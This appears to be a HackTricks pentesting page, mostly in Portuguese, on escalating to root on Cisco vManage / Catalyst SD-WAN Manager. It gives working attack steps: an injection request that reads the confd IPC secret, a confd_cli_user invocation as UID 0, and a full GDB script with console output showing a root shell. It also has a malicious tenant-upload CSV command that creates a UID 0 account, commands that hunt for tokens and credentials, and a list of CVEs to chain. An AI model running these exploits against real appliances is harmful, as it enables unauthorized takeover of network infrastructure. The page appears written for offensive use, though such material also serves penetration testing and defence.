# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Once you have code execution on Cisco vManage / *Catalyst SD-WAN Manager* as `vmanage`, `netadmin`, or `vmanage-admin`, as superfícies locais de privesc mais interessantes geralmente são a stack de CLI do `confd`, o helper `cmdptywrapper`, as APIs REST de localhost e os handlers de import/upload pertencentes ao root.

Se você ainda precisa do **initial foothold** em um controller, consulte primeiro a página dedicada ao control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Triagem local rápida
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Se `/etc/confd/confd_ipc_secret` estiver legível a partir do seu foothold, Path 1 e Path 2 se tornam imediatamente viáveis. Se você chegou por meio de um remote info leak ou de um webshell, verifique também se já consegue acessar o material SSH de `vmanage-admin` ou os handlers de upload de multitenancy: pesquisas de 2026 mostraram que ambos eram pontos de apoio realistas.

## Path 1

(Exemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))<sup>[[5]](#references)</sup>

Após investigar um pouco a [documentação](http://66.218.245.39/doc/html/rn03re18.html) relacionada ao `confd` e aos diferentes binários (acessível com uma conta no site da Cisco), descobrimos que, para autenticar o socket IPC, ele utiliza um secret localizado em `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Lembra-se da nossa instância do Neo4j? Ela está sendo executada com os privilégios do usuário `vmanage`, permitindo-nos recuperar o arquivo usando a vulnerabilidade anterior:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
O programa `confd_cli` não aceita argumentos de linha de comando, mas chama `/usr/bin/confd_cli_user` com argumentos. Portanto, podemos chamar diretamente `/usr/bin/confd_cli_user` com nosso próprio conjunto de argumentos. No entanto, ele não pode ser lido com nossos privilégios atuais, então precisamos recuperá-lo do rootfs e copiá-lo usando scp, ler a ajuda e usá-lo para obter o shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Caminho 2

(Exemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))<sup>[[6]](#references)</sup>

O blog<sup>[[5]](#references)</sup> da equipe synacktiv descreveu uma maneira elegante de obter um root shell, mas a ressalva é que isso exige obter uma cópia de `/usr/bin/confd_cli_user`, que só pode ser lida pelo root. Encontrei outra maneira de escalar para root sem esse trabalho.

Quando desmontei o binário `/usr/bin/confd_cli`, observei o seguinte:

<details>
<summary>Objdump mostrando a coleta de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Ao executar “ps aux”, observei o seguinte (_observe -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Eu levantei a hipótese de que o programa “confd_cli” passa o ID de usuário e o ID de grupo coletados do usuário conectado para a aplicação “cmdptywrapper”.

Minha primeira tentativa foi executar o “cmdptywrapper” diretamente e fornecer `-g 0 -u 0`, mas falhou. Parece que um descritor de arquivo (-i 1015) foi criado em algum momento do processo, e não consigo falsificá-lo.

Conforme mencionado no blog da synacktiv (último exemplo), o programa `confd_cli` não aceita argumentos de linha de comando, mas posso influenciá-lo com um debugger e, felizmente, o GDB está incluído no sistema.

Criei um script do GDB no qual forcei as APIs `getuid` e `getgid` a retornarem 0. Como já tenho o privilégio “vmanage” por meio do deserialization RCE, tenho permissão para ler diretamente `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Saída do Console:

<details>
<summary>Saída do console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Caminho 3 (bug de validação de entrada da CLI de 2025 - CVE-2025-20122)

A Cisco posteriormente documentou um caminho local mais limpo para root em seu próprio advisory sobre [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): um **attacker autenticado com apenas privilégios de somente leitura** poderia enviar uma requisição criada especialmente para a CLI do manager e obter root devido à validação de entrada insuficiente.<sup>[[7]](#references)</sup>

De uma perspectiva ofensiva, esta é a conclusão importante:

1. Assim que você tiver *qualquer* foothold com poucos privilégios no dispositivo, teste o serviço de CLI local antes de executar o workflow mais pesado do Caminho 1 / Caminho 2.
2. Reutilize os artefatos do Caminho 2 para encontrar o limite de confiança: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Considere suspeito cada campo encaminhado ao backend da CLI: UID/GID, username, metadados do terminal, arquivos importados ou qualquer valor posteriormente consumido por um helper de propriedade do root.
4. Se um usuário com poucos privilégios puder acessar o socket local da CLI e influenciar esses campos, o root pode estar a apenas uma requisição criada especialmente de distância.

Um fluxo de trabalho prático após obter acesso ao appliance é:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Isso transforma o bug de 2025 em um bom padrão de hunting para versões semelhantes: procure **local CLI shims que coletam a identidade em userland e a encaminham para um wrapper com mais privilégios**.

Não confunda **CVE-2025-20122** com a posterior **CVE-2026-20122**: o problema de 2025 é um bug *local* de CLI para root, enquanto o problema de 2026 é um overwrite arbitrário de arquivos via API *remota*, principalmente útil para plantar um foothold e depois revisitar Path 1 / Path 2 / Path 4.

## Path 4 (API REST local de baixo privilégio para root - CVE-2026-20126)

O advisory da Cisco de fevereiro de 2026 também introduziu outra classe útil de privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permitia que um **atacante autenticado, local e com baixos privilégios** obtivesse root devido a um mecanismo insuficiente de autenticação de usuários na API REST.<sup>[[1]](#references)</sup>

Isso é importante porque o privesc no vManage não está mais limitado ao abuso de `confd`/TTY. Após obter um shell com baixos privilégios, procure também por:

- endpoints de API acessíveis apenas via localhost que confiam demais no chamador
- tokens, cookies ou credenciais de serviço legíveis pela conta atual
- ações exclusivas de root expostas por handlers `dataservice`/REST que ainda possam ser acionadas localmente

Na prática, depois de obter um shell como `vmanage` ou outro usuário de serviço, o abuso da API local costuma ser mais discreto e fácil de automatizar do que o abuso interativo da CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Se o contexto da sessão local for suficiente para acessar funcionalidades REST privilegiadas, prefira o caminho da API: é mais fácil de reproduzir, automatizar e encadear com web sessions ou API tokens roubados.

## Path 5 (arquivo criado em 2026 processado por root - CVE-2026-20245)

Outro padrão recente é o [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): um atacante local com privilégios `netadmin` poderia fazer upload de um **arquivo especialmente criado** que posteriormente era processado de forma insegura pela CLI, levando à command injection como `root`.<sup>[[2]](#references)</sup>

Do ponto de vista do HackTricks, a técnica valiosa é mais ampla que a CVE específica:

1. Enumere todo workflow de CLI ou web que aceite um arquivo: imports, diagnostic bundles, templates, validators, backups, tenant data etc.
2. Rastreie onde o arquivo enviado é armazenado e qual script ou binário pertencente a root o consome.
3. Teste se o nome do arquivo, o conteúdo do arquivo ou os metadados analisados são passados em algum momento para comandos shell, wrapper scripts ou helpers no estilo `system()`.
4. Se você já consegue acessar `netadmin` (credenciais válidas, sessão roubada ou uma cadeia de auth-bypass), bugs de processamento de arquivos costumam ser o caminho mais rápido para root.

Posteriormente, Google Cloud / Mandiant demonstraram uma instância muito concreta dessa classe de bugs sendo explorada por meio do caminho de importação de multitenancy:<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
No ataque observado, o CSV criado acabou modificando `/etc/passwd` e `/etc/shadow` para criar uma conta temporária com UID 0 (`troot`).<sup>[[4]](#references)</sup> Isso torna importadores no estilo `tenant-upload` / `tenant-list` especialmente interessantes: eles não são apenas recursos de ingestão de dados, mas potenciais front-ends de parser executados como root.

Um padrão rápido de hunting pelo lado do shell é:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Essa classe de bug combina especialmente bem com acessos remotos que concedem `netadmin`, mas não `root`.

## Outras vulns recentes do vManage/Catalyst SD-WAN Manager para encadear

- **Info leak não autenticado (CVE-2026-20133)** – Especialmente valioso porque pesquisas públicas mostraram que ele poderia expor `confd_ipc_secret` ou a chave privada de `vmanage-admin`, transformando um bug de leitura em Path 1 ou em um pivot NETCONF.<sup>[[3]](#references)</sup>
- **Sobrescrita arbitrária de arquivos via API autenticada (CVE-2026-20122)** – Diferente do bug de CLI de 2025 acima; a VulnCheck usou-o para fazer upload de um webshell, o que torna imediatamente relevantes os caminhos de privesc local nesta página.<sup>[[3]](#references)</sup>
- **XSS autenticado na UI (CVE-2024-20475)** – Roube uma sessão de admin na web UI e, em seguida, faça pivot para ações de API/CLI que eventualmente alcancem `vshell` ou um dos caminhos de privesc local acima.
- **Bypass de autenticação remoto para `netadmin` (CVE-2026-20129)** – Um precursor muito forte para o Path 5, porque `netadmin` é exatamente o nível exigido pelo privesc com arquivo especialmente criado de 2026.<sup>[[3]](#references)</sup>
- **Escrita arbitrária de arquivos autenticada (CVE-2026-20262)** – Valor ofensivo semelhante ao do CVE-2026-20122, mas por meio de um caminho posterior de upload da web UI: escreva em um local que posteriormente será analisado pelo root ou pela camada web do management plane.
- **Downgrade para ressuscitar o privesc antigo de CLI (CVE-2022-20775)** – Intrusões de 2026 mostraram que attackers podem reverter para uma build antiga e vulnerável de SD-WAN, abusar do bug antigo de root na CLI e, em seguida, restaurar a versão original.<sup>[[8]](#references)</sup>
- **Bypass de autenticação do control plane antes da autenticação (CVE-2026-20182)** – Mais bem documentado na página dedicada ao control plane do SD-WAN; ele pode adicionar uma chave SSH para `vmanage-admin`, fornecendo o acesso local necessário para revisitar esta página.



## Referências

- [1] [Vulnerabilidades do Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Vulnerabilidade de escalada de privilégios autenticada no Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager e Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Vulnerabilidades recentes do Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Exploração de Zero-Day da Vulnerabilidade (CVE-2026-20245) no Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting do Cisco SD-WAN Parte 1: Atacando o vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking do Cisco SD-WAN vManage 19.2.2 — De CSRF à Execução Remota de Código](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Vulnerabilidade de escalada de privilégios do Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Exploração ativa do Cisco Catalyst SD-WAN pelo UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)

{{#include ../../banners/hacktricks-training.md}}
